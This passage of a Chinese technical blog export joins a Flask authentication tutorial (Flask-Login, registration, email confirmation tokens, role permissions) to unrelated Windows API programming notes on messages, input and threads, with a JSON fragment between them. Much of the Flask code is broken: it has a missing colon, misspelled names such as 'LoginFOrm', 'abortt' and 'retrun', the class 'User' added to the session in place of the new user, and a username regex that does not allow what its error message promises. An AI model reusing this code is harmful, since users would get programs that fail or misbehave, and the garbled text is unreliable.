的蓝本验证身份，保存在同名python包中。这个蓝本的包构造函数创建蓝本对象，再从views.py模块中导入路由。app/auth/__imit__.py： 1234from flask import Blueprintauto = Blueprint('auth', __name__)from . import views views.py 导入蓝本，然后使用蓝本的route 装饰器定义身份与验证相关的路由。这里添加了/login路由，app/auth/views.py： 123456from flask import render_templatefrom . import auth@auth.route('/login'): def login(): return render_template('auth/login.html') auth 蓝本要在 create_app 工厂函数中附加到应用上，app/__init__.py： 12345def create_app(config_name): # ... from .auth import auth as auth_blueprint app.register_blueprint(auth_blueprint, url_prefix='/auth') return app 注册蓝本使用的url_prefix时可选参数，注册后蓝本定义的所有路由会加上指定的前缀。例如/lgoin会注册成/auth/login。 使用 Flask-Login 验证身份登录后，用户的验证状态要记录在用户会话中。Flask-Login 用于管理用户身份验证系统中的验证状态，不依赖特定的身份验证机制。pip install flask-login 准备用于登录的用户模型Flask-Login的运行需要应用中有 User对象，User模型必须实现几个属性和方法： 属性/方法 说明 is_suthenticated 如果用户提供的登录凭据有效则返回True is_active 如果允许用户登录，返回True；如果想禁用用户，可以返回False is_anonymous 对普通用户返回False，对匿名用户返回True get_id() 返回用户的唯一标识符，使用Unicode编码字符串 这些属性和方法可以在模型类中实现，但是Flask-Login提供了UserMixin类，包含了默认实现，能满足多数需求，修改用户模型，app/models.py: 123456789from flask_login import UserMixinclass User(UserMixin, db.Model): __tablename__ = 'users' id = db.Column(db.Integer, primary_key=True) email = db.Column(db.String(64), unique=True, index=True) username = db.Column(db.String(64), unique = True) password_hash = db.Column(db.String(128)) role_id = db.Column(db.Integer, db.ForeignKey('roles.id')) 这个示例中，用户使用电子邮件登录。 Flask-Login在应用的工厂函数中初始化，app/__init__.py： 123456789from flask_login import LoginManagerlogin_manager = LoginManager()login_manager.login_view = 'auth.login'def create_app(config_name): #... login_manager.init_app(app) #... LoginManager 对象的 login_view 属性用于设置登陆页面的端点。匿名用户尝试访问受保护的页面时，Flask-Login将重定向到登陆页面，因为登陆路由在蓝本中定义，所以需要加上蓝本的名称。 Flask-Login 要求应用指定一个函数，在扩展需要从数据库中获取指定标识符对应的用户时调用，app/models.py： 12345from . import login_manager@login_manager.user_loaderdef load_user(user_id): return User.query.get(int(user_id)) login_manager.user_loader 装饰器把这个函数注册给 Flask-Login，在这个扩展需要获取一登陆用户的信息时调用，传入的用户标识符是一个字符串，因此这个函数先把标识符转换成整数，然后传给 Flask-SQLAlchemy 查询，加载用户。正常情况下这个返回值是用户对象，如果失败返回None。 保护路由为了保护路由，只让通过身份验证的用户访问，Flask-Login提供了一个login_required 装饰器，可以使用多个装饰器，各装饰器只对随后的装饰器和目标函数起作用。以下例子中，两个装饰器不能对调位置： 123456from flask_login import login_required@app.route('/secret')@login_requireddef secret(): pass 添加登录表单呈现给用户的登录表单中包含一个用于输入电子邮件地址的文本字段，一个密码字段，一个 记住我 复选框和一个提交按钮，使用Flask-WTF类，/app/auth/forms.py： 123456789from flask_wtf import FlaskFormfrom wtforms import StringField, PasswordField, BoolenField, SubmitFieldfrom wtforms.validators import DataRequired, Length, Emailclass LoginForm(FlaskForm): email = StringField('Email', validators=[DataRequired(), Length(1,64), Email()]) password = PasswordField('Password', validators=[DataRequired()]) remember_me = BooleanField('Keep me logged in') submit = SubmitField('Log In') PasswordField 类表示属性为 type=”password” 的 input 元素，BooleanField类表示复选框。电子邮件字段用到了Length，Email，和DataRequired三个验证函数。登录页面使用的模板保存在 auth/login.html中，只需使用Flask-Bootstrap提供的 wtf.quick_form 宏渲染表单即可。base.html中的导航栏可以使用Jinja2条件语句判断当前用户的登陆状态，分别显示 Log In 或 Log out 链接，app/templates/base.html： 1234567&lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; {% if current_user.is_authenticated %} &lt;li&gt;&lt;a href=&quot;{{ url_for('auth.logout') }}&quot;&gt;Log Out&lt;/a&gt;&lt;/li&gt; {% else %} &lt;li&gt;&lt;a href=&quot;{{ url_for('auth.login') }}&quot;&gt;Log In&lt;/a&gt;&lt;/li&gt; {% endif %}&lt;/ul&gt; 判断条件中的变量 current_user 由Flask-Login定义，在视图函数和模板中自动可用，这个变量的值是当前登录的用户，如果未登录则是一个匿名用户代理对象，它的 isauthenticated 属性是False，，所以可以判断用户是否登录。 登入用户实现 login，app/auth/views.py： 12345678910111213141516171819from flask import render_template, redirect, request, url_for, flaskfrom flask_login import login_userfrom . import authfrom ..models import Userfrom .forms import LoginForm@auth.route('/login', methods=['GET', 'POST'])def login(): form = LoginFOrm() if form.validate_on_submit(): user = User.query.filter_by(email=form.email.data).first() if user is not None and user.verify_password(form.password.data) login_user(user, form.remember_me.data) next = request.args.get('next') if next is None or not next.startswith('/'): next = url_for('main.index') return redirect(next) flash('Invalid username or password.') return render_template('auth/login.html', form=form) 修改后的模板，app/templates/auth/login.html： 1234567891011{% extends &quot;base.html&quot; %}{% import &quot;bootstrap/wtf.html&quot; as wtf %}{% block title %}Flasky - Login{% endblock %}{% block page_content %}&lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt;Login&lt;/h1&gt;&lt;/div&gt;&lt;div class=&quot;col-md-4&quot;&gt; {{ wtf.quick_form(form) }}&lt;/div&gt;{% endblock %} 登出用户退出路由的实现，app/auth/views.py： 12345678from flask_login import logout_user, login_required@auth.route('/logout')@login_requireddef loggout(): logout_user() flash('You have benn logged gout.') return redirect(url_for('main.index')) 理解 Flask-Login 的运作方式用户登录过程涉及的操作： 点击 Log In 链接，访问 /auth/login，处理这个URL的函数返回登陆表单模板。 用户输入用户名和密码，点击提交，调用相同的处理函数，但这一次是POST请求。处理函数会验证表单提交的凭据，调用Flask-Login的 login_user函数，登入用户。login_user函数把用户ID以字符串形式写入用户会话。视图函数重定向到首页。 浏览器收到重定向，请求首页。调用首页的视图函数，渲染模板，出现对 current_user的引用。这个请求没有给上下文变量 current_user 赋值，因此调用Flask-Login内部的 _get_user函数，找出用户是谁。_get_user检查用户会话中有没有用户ID，如果没有，返回一个Flask-Login的 AnonymousUser实例，如果由，调用应用中使用 user_load 装饰器注册的函数，传入用户ID。应用中的 user_ loader 从数据库中读取用户并返回。Flask-login把它赋值给当前请求的 current_user上下文变量。模板接收它。 使用 login_required 装饰器装饰的试图函数将使用 current_user 上下文变量判断 current_user.is_authenticated 表达式是否为 True 。logout_user 函数比较简单，直接从用户会话中删除用户ID。 登录测试为验证登录功能可用，可以更新首页，使用已登录用户的名字显示一个欢迎信息。app/templates/index.html： 123456Hello,{% if current_user.is_autenticated %} {{ current_user.username }}{% else %} Stranger{% endif %}! 因为未实现注册功能，目前只能在shell中注册新用户。 1234flask shellu = User(email='john@example.com', username='john', password='cat')db.session.add(u)db.session.commit() 访问首页可以看到结果 注册新用户如果新用户想成为应用的成员，必须在应用中注册。这样应用才能识别并登入用户。登录页面要显示一个注册页面的链接，让用户输入电子邮件地址，用户名和密码。 添加用户注册表单app/auth/forms.py： 12345678910111213141516171819from flask_wtf import FlaskFormfrom wtforms import StringField, PasswordField, BooleanField, SubmitFieldfrom wtforms import ValidationErrorfrom ..models import Userclass RegistrationForm(FlaskForm): email = StringField('Email', validators=[DataRequired(), Length(1,64), Email()]) username = StringField('Username', validators=[DataRequired(), Length(1,64), Regexp('^[A-Za-z][A-Za-z0-9]*$', 0, 'Username must have only letters, numbers, dots or ' 'underscores')]) password = PasswordField('Password', validators=[DataRequired(), EqualTo('password2', message='Password must math.')]) password2 = PasswordField('Confirm password', validators=[DataRequired()]) submit = SubmitField('Register') def validate_email(self, field): if User.query.filter_by(email=field.data).first() raise ValidationError('Email already registered.') def validate_username(self, field): if User.query.filter_by(username=field.data).first(): raise ValidatioinError('Username already in use.') 这个表单使用WTForms提供的Regexp验证函数，后面两个参数分别是正则表达式标志和验证失败显示的错误信息。EqualTo验证函数检查两个字段是否一致，输入为另一个字段。还含有两个自定义验证函数，以方法方式实现。如果表单定义了validate_开头并且后面跟着字段名的方法，这个方法就和常规的验证函数一起使用。这里为email 和 username 定义了验证函数，确保数据库中没有出现过。自定义验证函数表示验证失败可以跑出 ValidationError 异常，参数是错误信息。 显示这个表单的模板是 app/templates/auth/register.html，使用wtf.quick_form渲染表单，登录页面要显示一个指向注册页面的链接，app/templates/auth/login.html： 123456&lt;p&gt; New user? &lt;a href=&quot;{{ url_for('auth.register') }}&quot;&gt; Click here to register &lt;/a&gt;&lt;/p&gt; 注册新用户app/auth/views.py： 12345678910@auth.route('/register', methods=['GET', 'POST'])def register(): form = RegistrationForm() if form.validate_on_submit(): user = User(email=form.email.data, username=form.username.data, password=form.password.data) db.session.add(User) db.session.commit() flash('You can now login.') return redirect(url_for('auth_login'))return render_template('auth/register.html', form=form) 确认账户有时需要确认用户提供的信息是否正确，常见于检查电子邮件地址。通过向提供的邮箱发送确认邮件，要求用户点击一个包含确认令牌的特殊URL可以确认。 使用 itsdangerous 生成确认令牌123456789flask shellfrom itsdangerous import TimedJSONWebSignatureSerialize as Serializers = Serializer(app.config['SECRET_KEY'], expires_in=3600)token = s.dumps({'confirm': 23})token# evJh........data = s.loads(token)data# {'confirm': 23} itsdangerous 提供多种生成令牌的方法，其中 TimedJSONWebSignatureSerializer 正常具有过期时间的 JSON Web签名（JWS），构造函数接受的参数是一个密钥，可以使用 SECRET_KEY 设置。 dumps 方法为指定的数据生成一个加密签名，然后对数据和签名进行序列化，生成令牌字符串。expires_in参数设置过期时间，单位是秒。 loads 方法解码令牌，参数是令牌字符串，检验签名和过期时间。如果都有效，返回原始数据，否则抛出异常。这个功能可以添加到User模型中。app/models.py： 123456789101112131415161718192021from itsdangerous import TimedJSONWebSignatureSerializer as Serializerfrom flask import current_appfrom . import dbclass User(UserMixin, db.Model): # ... confirmed = db.Column(db.Boolean, default=False) def generate_confirmation_token(self, expiration=3600): s = Serializer(current_app.config['SECRET_KEY'], expiration) return s.dumps({'confirm': self.id}).decode('utf-8') def confirm(self, token): s = Serializer(current_app.config['SECRET_KEY']) try: data = s.loads(token.encode('utf-8')) except: return False if data.get('confirm') != self.id return False self.confirmed = True db.session.add(self) return True 发送确认邮件当前的/register路由把新用户添加到数据库中之后会重定向到/index，在这之前需要发送确认邮件，app/auth/views.py： 123456789101112from ..email import send_email@app.route('/register', methods=['GET', 'POST'])def register(): form = RegistrationForm() if form.validate_on_submit(): # ... db.session.add(User) db.session.conmmit() token = user.generate_cofirmation_token() send_email(user.email, 'Confirm Your Account', 'auth/email/confirm', user=user, token=token) flash('A confirmation email has been sent to your') 身份验证蓝本使用的电子邮件模板保存在 templates/auth/email 目录中，以便与HTML模板区分。一个电子邮件需要两个模板，分别用于渲染纯文本正文和HTML正文。例如以下纯文本模板，app/templates/auth/email/confirm.txt： 1234Dear {{ user.username }}Welcome to Flasky!To confirm your account please click on the following link:{{ url_for('auth.confirm', token=token, _external=True) }} 确认账户的视图函数，app/auth/views.py： 12345678910111213from flask_login import current_user@auth.route('/confirm/&lt;token&gt;'):@login_requireddef confirm(token): if current_user.confirmed: return redirect(url_for('main.index')) if current_user.confirm(token): db.session.commit() flash('You have confirmed your account.') else: flash('The confirmation link is invalid or has expired.') return redirect(url_for('main.index')) 由于令牌确认完全在User模型中完成，因此视图函数只需要调用 confirm 方法即可，再根据确认结果显示不同的信息。确认成功后，User模型中 confirmed属性的值会修改并添加到会话中，然后提交数据库会话。 各个应用可以自行决定用户确认账户之前可以做哪些操作，比如允许未经确认的用户登录，但只显示一个界面，要求访问之前确认账户。这一步可以通过 Flask 提供的 before_request 钩子完成，对于蓝本来说，before_request 钩子只能应用到属于蓝本的请求上。如果想在蓝本中使用针对应用全局请求的钩子，必须使用 before_app_request装饰器。app/auth/views.py： 12345678910111213@auth.before_app_requestdef before_request(): if current_user.is_authenticated \\ and not current_user.confirmed \\ and request.blueprint != 'auth' \\ and request.endpoint != 'static': return redirect(url_for('auth.unconfirmed'))@auth.route('/unconfirmed')def unconfirmed(): if current_user.is_anonymous or current_user.confirmed: return redirect(url_for('main.index')) return render_template('auth/confirmed.html') 用户已登录，未确认并且请求的URL不在身份验证蓝本中，不是对静态文件的请求，要赋予用户访问路由的权限时，before_app_request 会拦截请求，重定向到auth/unconfirmed。 重新发送账户确认邮件，app/auth/views.py： 12345678@auth.route('/confirm')@login_requireddef resend_confirmation(): token = current_user.generate_confirmation_token() send_email(current_user.email, 'Confirm Your Account', 'auth/email/confirm', user=current_user, token=token) flash('A new confirmation email has been sent to you.') return redirect(url_for('main.index')) 管理账户拥有应用账户的用户有时可能需要修改账户信息，也可添加功能。 用户角色实现方式结合了分立的角色和权限，赋予用户分立的角色，但是哥哥角色都通过权限列表定义允许用户执行的操作。 角色在数据库中的表示改进后的Role模型，app/models.py： 123456789101112class Role(db.Model): __tablename__ = 'roles' id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(64), unique=True) default = db.Column(db.Boolean, default=False, index=True) permissions = db.Column(db.Integer) users = db.reationship('User', backref='role', lazy='dynamic') def __init__(self, **kwargs): super(Role, self).__init__(**kwargs) if self.permissions is None: self.permissions = 0 这里新增了 default 字段，这是注册新用户时赋予的角色，只能有一个角色的这个字段为 True，因为应用在 roles 表中搜索默认角色，因此设置了索引。另一处改动是增加了 permissions 字段，SQLAlchemy 默认把这个字段的值设为None，因此添加了一个类构造函数，默认把 permissions设置为0。各操作所需的权限在不同的应用中是不一样的，定义权限： 操作 权限名 权限值 关注用户 FOLLOW 1 在他人的文章中发表评论 COMMENT 2 写文章 WRITE 4 管理他人发表的评论 MODERATE 8 管理员权限 ADMIN 16 使用2的幂表示权限可以方便的组合权限。app/models.py： 12345678910111213141516171819class Permission: FOLLOW = 1 COMMENT = 2 WRITE = 4 MODERATE = 8 ADMIN = 16class Role(db.Model): # ... def add_permission(self, perm): if not self.hash_permission(perm): self.permissions += perm def remove_permission(self, perm): if self.has_permission(perm): self.permissions -= perm def reset_permissions(self): self.permissions = 0 def has_permission(self, perm): return self.permissions &amp; perm == perm 用户角色和权限组合的定义： 用户角色 权限 说明 匿名 无 未登录用户 用户 FOLLOW, COMMENT, WRITE 新用户默认角色 协管员 FOLLOW, COMMENT, WRITE, MODERATE 增加管理其他用户评论的权限 管理员 FOLLOW, COMMENT, WRITE, MODERATE, ADMIN 具有所有权限，包括修改其他用户所属角色 可以在Role类中添加一个类方法，将角色添加到数据库。既方便测试，也方便部署到生产环境。app/models.py 1234567891011121314151617181920class Role(db.Model): # . @staticmethod def insert_roles(): roles = { 'User': [Permission.FOLLOW, Permission.COMMENT, Permission.WRITE], 'Moderator': [Permission.FOLLOW, Permission.COMMENT, Permission.WRITE, Permission.MODERATE], 'Administrator': [Permission.FOLLOW, Permission.COMMENT, Permission.WRITE, Permission.MODERATE, Permission.ADMIN] } default_role = 'User' for r in roles: role = Role.query.filter_by(name=r).first() if role is None: role = Role(name=r) role.reset_permission() for perm in roles[r]: role.add_permission(perm) role.default = (role.name == default_role) db.session.add(role) db.session.commit() insert_roles 函数不直接创建角色对象，通过角色名查找现有的角色，然后进行更新。没有角色时创建新角色对象。它是一个静态方法，不需要创建对象，直接在类上调用，例如Role.insert_roles()，静态方法参数中没有 self。 赋予角色用户注册账户时应被赋予用户角色，管理员在最开始就应该赋予 管理员 角色，由保存在设置变量FLASKY_ADMIN 中的电子邮件地址识别，app/models.py： 12345678910class User(UserMixin, db.Model): # ... def __init__(self, **args): super(User, self).__init(**kwargs) if self.role is None: if self.email == current_app.config['FLASKY_ADMIN']: self.role = Role.query.filter_by(name='Administrator').first() if self.role is None: self.role = Role.query.filter_by(default=True).first# ... User 类的构造函数先调用积累的构造函数，如果没有定义角色，用电子邮件确定角色。 检验角色为了简化角色和权限的实现过程，可在User模型中添加辅助方法，检查权限，可以委托前面添加的权限管理方法，app/models.py： 1234567891011121314from flask_login import UserMixin, AnonymousUserMixinclass User(UserMixin, db.Model): # ... def can(self, perm): return self.role is not None and self.role.hase_permission(perm) def is_administrator(self): return self.can(Permission.ADMIN)class AnonymousUser(AnonymousUserMixin): def can(self, permissions): return False def is_administrator(self): return Falselogin_manager.anonymous_user = AnonymousUser 如果想让视图函数只对由特定权限的用户开放，可以使用自定义装饰器。app/decorators.py： 12345678910111213141516from functools import wrapsfrom flask_import abortfrom flask_login import current_userdef permission_required(permission): def decorator(f): @wraps(f) def decorated_funtion(*args, **kwargs): if not_current_user.can(permission): abortt(403) return f(*args, **kwargs) retrun decorated_funtion return decoratordef admin_required(f): return permission_required(Permission.ADMIN)(f) 装饰器的使用： 123456789101112from .decorators import admin_required, permission_required@main.route('/admin')@login_required@admin_requireddef for_admins_only(): return &quot;For administrators&quot;@main.route('/moderate')@login_required@permission_required(Permission.MODERATE)def for_moderators_only(): return &quot;For comment moderators&quot; 在模板中可能也需要检查权限，所以Permission类的所有常量要能在模板中访问，为了避免每次都调用 render_template 时多添加一个参数，可以使用上下文处理器。在渲染时，上下文处理器能让变量在所有模板中可访问，app/main/__init__.py： 123@main.app_context_processordef inject_permissions(): return dict(Permission=Permission) 编写角色和权限的测试，tests/test_user_model.py： 12345678910111213141516class UserModelTestCase(unittest.TestCase): # ... def test_user_role(self): u = User(email='john@example.com', password='cat') self.assertTrue(u.can(Permission.FOLLOW)) self.assertTrue(u.can(Permission.COMMENT)) self.assertTrue(u.can(Permission.WRITE)) self.assertFalse(u.can(Permission.MODERATE)) self.assertFalse(u.can(Permission.ADMIN)) def test_anonymous_user(self): u = AnonymousUser() self.assertFalse(u.can(Permission.FOLLOW)) self.assertFalse(u.can(Permission.COMMENT)) self.assertFalse(u.can(Permission.WRITE)) self.assertFalse(u.can(Permission.MODERATE)) self.assertFalse(u.can(Permission.ADMIN)) 先在 shell 会话中添加这些新角色到开发数据库 123flask shellRole.insert_roles()Role.query.all() 最好更新用户列表，为在此之前创建的用户账户分配用户角色 123456789flask shelladmin_role = Role.query.filter_by(name='Administrator').first()default_role = Role.query.filter_by(default=True).first()for u in User.query.all(): if u.email == app.config['FLASKY_ADMIN']: u.role = admin_role else: u.role = default_roledb.session.commit() 用户资料资料信息在数据库中存储一些额外信息用于站视，扩充 User模型，app/models.py： 1234567class User(UserMixin, db.Model): # ... name = db.Column(db.String(64)) location = db.Column(db.String(64)) about_me = db.Column(db.Text()) member_since = db.Column(db.DateTime(), default=datatime.utcnow) last_seen = db.Column(db.dateTime(), default=datetime.utcnow) db.Column的default参数可以接受函数作为参数，每次需要生成默认值，SQLAlchemy都会调用指定的函数。member_since只需要使用一次默认值，而last_seen每次用户访问后都需要刷新，可以在User类中添加一个方法执行这个操作，app/models.py： 123456class User(UserMixin, db.Model): # ... def ping(self): self.last_seen = datetime.utcnow() db.session.add(self) db.session.commit() 每次收到用户请求都要调用这个 ping 方法，可以使用 auth 蓝本中的 before_app_request 处理程序，app/auth/views.py： 1","link":"/2019/11/23/flask/"},{"title":"Windows 编程","text":"Windows 编程 Windows 程序设计窗口和消息总体结构Windows 程序设计实质上是面向对象的升序设计，操作对象为窗口（window），程序员与用户的视角基本一致。 使用RegisterClass注册窗口类，使用CreateWindow创建窗口。 Windows 会在特定情况下向窗口发送消息，程序建立的每一个窗口都有窗口消息处理函数，Windows 会调用消息处理函数，函数根据收到的消息进行处理，完成后将控制权交还给 Windows。 Windows 程序开始执行后，系统为该程序建立一个消息队列，用于存放部分该程序将要接收到的消息。程序通过一段称为消息循环的代码从消息队列中取出消息，将消息发送给窗口处理函数。有些消息会直接发送给窗口处理函数，不会进入消息队列。消息循环一般如下： 12345while(GetMessage(&amp;msg, NULL, 0, 0)){ TranslateMessage(&amp;msg); // 处理关于键盘（鼠标）的消息 DispatchMessage(&amp;msg); // 将消息发送到窗口处理函数} 窗口生命周期 注册窗口类 建立窗口 显示窗口 消息循环 处理消息（窗口消息处理程序） 部分标识符 前缀 英文 含义 CS ClassStyle 窗口样式 CW CreateWindow 创建窗口 DT DrawText 绘制文字 IDI ID of Image 图标ID IDC ID of Cursor 光标ID MB MessageBox 消息框 SND Sound 声音 WM WindowMessage 窗口消息 WS WindowStyle 窗口样式 结构体 类型 含义 MSG 消息结构体 WNDCLASS 窗口类别结构体 PAINTSTRUCT 绘图结构 RECT 矩形结构 句柄 类型 含义 HINSTANCE 程序句柄 HWND 窗口句柄 HDC 设备句柄（Device Contxt） 输出文字绘制和更新Windows 中只能在窗口的显示区域绘制文字和图形，而且不能确保显示区域内的内容一直保存直到下一次修改。 WM_PAINT 消息Windows 向程序发送 WM_PAINT 消息时，表示窗口部分或全部显示区域需要重新绘制。 多数程序在 WinMain 进入消息循环之前会调用UpdateWindow来发送第一个 WM_PAINT 消息。之后在下列事件之一发生时，窗口消息处理程序会收到一个 WM_PAINT 消息： 移动或显示窗口时 改变窗口大小时 代码使用InvalidateRect或InvalidateRgn函数刻意产生 WM_PAINT 消息 一个窗口或者下拉菜单挡住部分窗口时，Windows 尝试保存遮挡的部分，但不一定成功，失败时也会发送 WM_PAINT 有效矩形和无效矩形窗口消息处理程序收到 WM_PAINT 消息后，会准备更新整个显示区域，但通常只需要更新一个较小的区域，称为无效区域/更新区域。 Windows 为每个窗口保存一个绘图消息结构，这个结构包含了包围无效区域的最小矩形的坐标和其他信息，这个矩形称为无效矩形。 如果消息处理程序处理 WM_PAINT 消息之前，显示区域的另一个区域也变为无效，Windows 将计算一个新的包围两个无效区域的无效区域并存入绘图信息结构，而不是将多个 WM_PAINT 放入消息队列。 在处理 WM_PAINT 期间，窗口消息处理程序调用了BeginPaint，整个区域都会变为有效，程序也可以调用ValidateRect使任意矩形变为有效。整个区域都有效时，目前消息队列中的 WM_PAINT 将被删除。 WM_SIZE当窗口尺寸发生变化时，Windows 会发送 WM_SIZE 消息。 GDI要在窗口的显示区域绘图（文字）需要使用 WIndows 图形设备接口（GDI）函数。 键盘基础键盘输入以消息形式传递给程序的窗口消息处理程序，Windows 有八种不通的消息。 获得焦点按下键盘时，只有一个窗口消息处理程序接受该消息，并且此消息包含窗口控件码。接收特定键盘事件的窗口具有输入焦点。 获取焦点时，Windows 发送 WM_SETFOCUS，失去焦点时，发送 WM_KILLFOCUS。 队列和同步按下键盘时，由 Windows 和键盘驱动程序将硬件扫描码转换成格式消息，消息首先存入 Windows 的系统消息队列中，当应用程序处理完前一个输入的消息时，Windows 从系统消息队列中取出下一个消息，放入程序的消息队列中。 按键和字符键盘消息分为按键和字符两类。对于能产生字符的按键或组合（比如 Shift+A）， Windows 发送按键和字符消息，否则（比如Home）只发送按键消息。 按键消息按下按键时，Windows 发送 WM_KEYDOWN 或 WM_SYSKEYDOWN，松开按键时发送 WM_KEYUP 或 WM_SYSKEYUP，按键消息也有实践信息，可以通过调用GetMessageTime获得。 系统按键和非系统按键包含 SYS 的为系统按键消息，通常程序忽略这些消息并交给DefWindowProc处理 虚拟键码虚拟键码保存在四个消息（WM_(SYS)?KEY[DOWN|UP]）中的 wParam 参数中，标识按下或者释放的按键。 大部分虚拟键码以 VK 开头，定义在 WINUSER.H 中。 lParam低16位为重复计数，当消息处理速度不如消息的产生速度时，积累的多个 KEYDOWN 消息会组合成一个，并增加重复计数。 16-23位为 OEM 扫描码，一般忽略。 30位为该键的先前状态，释放为0，按下为1。 31位为转换状态，与先前不同则为1，相同为0。 特殊按键需要知道处理消息时是否按下了 Shift/Alt/Ctrl 或锁定键，可以调用GetKeyState函数获取消息。 1iState = GetKeyState(VK_SHIFT) 为负则按下了 Shift键。 字符消息消息循环中，TranslateMessage函数将按键消息转换为字符消息。如果消息为 WM_KEYDOWN 或者 WM_SYSKEYDOWN，并且按键或者组合产生了一个字符，该函数就会将字符消息放入消息队列中。 字符消息分类字符消息有四类：WM_CHAR、WM_DEADCHAR、WM_SYSCHAR 、WM_SYSDEADCHAR。 通常程序只处理 WM_CHAR。 字符消息与按键消息的 lParam 相同，wParam包含的是 ANSI 或 Unicode 字符代码。 插入符号插入符号只在获取了焦点的窗口中有效，因此应在 WM_SETFOCUS 和 WM_KILLFOCUS 中处理。 鼠标鼠标消息鼠标移动过窗口的显示区域时，Windows 发送 WM_MOUSEMOVE 消息。二按下或松开按键时，发送以下消息： 键 按下 松开 双击 左 WM_LBUTTONDOWN WM_LBUTTONUP WM_LBUTTONDBLCLK 中 WM_MBUTTONDOWN WM_MBUTTONUP WM_MBUTTONDBLCLK 右 WM_RBUTTONDOWN WM_RBUTTONUP WM_RBUTTONDBLCLK 以上9个消息中，lParam 低16位为 x 坐标，高16位为 y 坐标，坐标原点为显示区域的左上角。提取值时可使用宏 12int x = LOWORD(lParam);int y = HIWORD(lParam); wParam 指出鼠标按键以及 Shift 和 Ctrl 的状态，通过与运算进行测试。 1wParam &amp; MK_SHIFT 如果在活动窗口按下鼠标，该窗口会变成活动窗口，然后收到 WM_LBUTTONDOWN 消息。 希望收到双击消息时，注册窗口类应包含 SC_DBLCLK 标识符。 非显示区域鼠标消息在窗口内显示区域外，Windows 会发送非显示区域鼠标消息，通常不需要处理。 命中测试代表非显示区域命中测试，优先于所有其他显示区域和非显示区域的鼠标消息。 通常程序将这个消息传给DefWindowProc，wParam 参数会存有测试结果：HTCLIENT 显示区域中，HTNOWHERE 不在窗口中，HTTRANSPARENT 窗口被另一个窗口覆盖， HTERROR 产生警示声音。 拦截鼠标在窗口外也可以接受鼠标消息。使用SetCapture拦截，ReleaseCapture释放。 鼠标滚轮滚动滚轮产生 WM_MOUSEWHEEL 消息。 子窗口控件概述子窗口和父窗口在有必要时可以互相发送消息。 存在一些预定义的子窗口类别，使用 CreateWindow可以直接使用，然后使用MoveWindow调整位置和尺寸。 子窗口获取焦点后，不能将焦点传回父窗口。 按钮类按钮样式以 BS 开头，子窗口 ID 必须强制转换为 HMENU 类型。 按钮样式 按钮 BS_PUSHBUTTON 按钮 BS_DEFPUSHBUTTON 按键 BS_CHECKBOX BS_AUTOCHECKBOX 复选框 BS_RADIOBUTTON BS_AUTORADIOBUTTON 单选按钮 BS_GROUPBOX 分组方块 子窗口向父窗口发送消息点击按钮，子窗口空间会向父窗口发送一个 WM_COMMAND消息，LOWORD(wParam)为子窗口ID，HIWORD(wParam)为通知码，lParam为子窗口句柄。 通知码 含义 0 BN_CLICKED 5 BN_DOUBLECLICKED or BN_DBLCLK 6 BN_SETFOCUS 7 BN_KILLFOCUS 点击按钮时子窗口获得输入焦点，此时只有空格可用，忽略其他键盘输入。 父窗口向子窗口发送消息除了发送 WM 开头的消息，也可以发送 BM 开头的消息。 消息 含义 BM_GETCHECK / BM_SETCHECK 取得或设定复选框和单选按钮的状态 BM_GETSTATE / BM_SETTATE 表示按钮是否处于被按下的状态 BM_SETSTYLE 改变按钮样式 子窗口控件具有唯一的窗口句柄和 ID 值，知道一个可以获取另一个。 123id = GetWindowLong(hwndChild, GWL_ID);id = GetDlgCtrlID(hwndChild);hwndChild = GetDlgItem(hwndParent, id); 改变按钮文字可以使用函数改变按钮文字 1SetWindowText(hwnd, pszString); 获取目前文字 1iLength = GetWindowText(hwnd, pszBuffer, iMaxlength); 可见和启用建立窗口时如果没有设置 WS_VISIBLE，那么调用 ShowWindow 才会显示窗口。 123456ShowWindow(hwndChild, SW_SHOWNORMAL);//不包含WS_VISIBLE显示子窗口 ShowWindow(hwndChild, SW_HIDE)；//包含WS_VISIBLE,用来隐藏窗口 IsWindowVisible(hwndChild);//确认子窗口是否可见 EnableWindow(hwndChild, FALSE);//使子窗口不被启用 EnableWindow(hwndChild, TRUE);//使子窗口被启用 IsWindowEnabled(hwndChild);//确认子窗口是否被启用 静态类别在 CreateWindow 函数中指定窗口为 static，就可以建立静态文字的窗口控件，它不接受鼠标和键盘输入，也不发送 WM_COMMAND 消息。 鼠标在静态子窗口中移动或按下时，子窗口会拦截 WM_NCHITTEST 消息并将 HTTRANSPARENT 的值传给 Windows，Winodws 再发送相同的 WM_NCHITTEST 消息给父窗口，通常父窗口不处理这个消息，发送给DefWindowProc。 滚动条类别建立窗口时通过加入 WS_VSCROLL 和 WS_HSCROLL 可以加入滚动条。 编辑框类别菜单及其他资源资源保存在 EXE 文件中，在不可执行程序的数据区。 多任务和多线程Windows 中的多线程通过CreateThread创建线程 1hThread = CreateThread(&amp;security_attributes, dwStackSize, ThreadProc, pParam, dwFlags, &amp;idThread) ThreadProc 是一个函数指针，指向线程函数，可以任意命名，但必须有如下格式 1DWORD WINAPI ThreadProc(PVOID pParam); pParam 就是传给 ThreadProc 的参数。 dwFlags 通常设置为零，如果设置为CREATE_SUSPENDED，表示这个线程创建后不会立即执行，保持在挂起状态，直到调用ResumeThread。 idThread 是一个指针，指向接受新线程ID的变量。 使用_beginThread函数创建线程，调用后，此线程函数中的代码和其他会被此线程调用的函数，会与程序中的其他代码同时运行，两个或多个线程可以使用一个进程中的相同函数。静态变量时所有线程共享的，自动局部变量（存储在栈上）是每个线程私有的数据。 1_beginThread(Thread, 0 NULL); 线程的同步临界区临界区（Critical Section）用于防止共享的数据呗破坏。使用临界区前必须定义一个临界区对象，然后初始化。 12CRITICAL_SECTION cs;InitializeCriticalSection(&amp;cs); 一个线程可以通过调用EnterCriticalSection进入临界区 1EnterCriticalSection(&amp;cs); 此时这个线程拥有这个临界区对象。两个线程不能同时拥有同一个临界区对象。如果一个线程进入了临界区，下一个线程尝试进入同一个临界区时将被挂起，直到第一个对象调用LeaveCriticalSection才会返回 1LeaveCriticalSection(&amp;cs); 不需要临界区对象时，可以删除 1DeleteCriticalSection(&amp;cs); 临界区机制涉及互斥（mutual exclusion），任何时刻只有一个线程拥有临界区。临界区的局限在于只能在同一个进程中使用。如果需要在进程间实现互斥，则应使用互斥对象（mutex）。 触发事件事件对象有两种状态，已触发（已设置）或未触发（已复位）。 1hEvent = CreateEvent(&amp;sa, fManual, fInitial, pszName); sa 是指向 SECURITY_ATTRIBUTES 的引用，pszName 是事件对象名，这两个参数只在事件对象在进程间共享时使用，单进程环境中通常被设置为 